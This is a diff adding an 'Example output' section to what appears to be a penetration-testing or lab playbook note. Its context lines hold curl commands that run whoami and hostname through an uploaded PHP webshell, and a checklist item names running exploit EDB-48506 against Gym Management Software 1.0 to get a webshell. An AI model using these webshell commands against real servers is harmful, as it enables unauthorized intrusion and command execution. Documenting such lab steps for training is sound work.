@@ -35,6 +35,13 @@ curl -s "http://$BoxIP:$WebPort/upload/kamehameha.php?telepathy=whoami"
 curl -s "http://$BoxIP:$WebPort/upload/kamehameha.php?telepathy=hostname"
 ~~~
 
+## Example output
+
+    www-data
+    WIN-HOST
+
+Focus on the resulting path and the command-execution identity. An HTTP 200 from the upload request only proves that the handler accepted the multipart form. A returned whoami or hostname value proves that the uploaded file is interpreted by the web server. Move next to [[Windows - Shell Received]] and remove the temporary file after the callback or proof is complete.
+
 ## What did you get?
 
 - [ ] Gym Management Software 1.0 is identified → **Run EDB-48506 and confirm the returned webshell**
